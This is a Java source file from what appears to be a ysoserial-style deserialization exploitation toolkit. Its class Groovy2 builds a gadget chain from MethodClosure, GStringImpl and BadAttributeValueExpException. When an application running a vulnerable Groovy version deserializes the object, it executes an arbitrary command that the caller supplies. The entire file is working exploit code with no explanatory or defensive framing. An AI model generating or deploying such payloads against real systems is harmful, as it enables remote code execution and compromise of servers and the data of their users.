package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.codehaus.groovy.runtime.GStringImpl;
import org.codehaus.groovy.runtime.MethodClosure;

import javax.management.BadAttributeValueExpException;

@Dependencies({"org.codehaus.groovy:groovy <2.4.3"})
@Authors({Authors.Unam4})
public class Groovy2 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        MethodClosure  execute= (MethodClosure) Reflections.createWithoutConstructor("org.codehaus.groovy.runtime.MethodClosure");
        Reflections.setFieldValue(execute,"owner",command);
        Reflections.setFieldValue(execute,"method","execute");
        GStringImpl gString = new GStringImpl(new Object[]{1},new String[]{"start"});
        try {
            Reflections.setFieldValue(execute,"maximumNumberOfParameters",0);
            Reflections.setFieldValue(execute,"ALLOW_RESOLVE",true);
        } catch (Exception e){
            Reflections.setFieldValue(execute,"maximumNumberOfParameters",0);
        }
        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(val,"val",gString);
        Reflections.setFieldValue(gString,"values",(new Object[]{execute}));
        return val;
    }

}
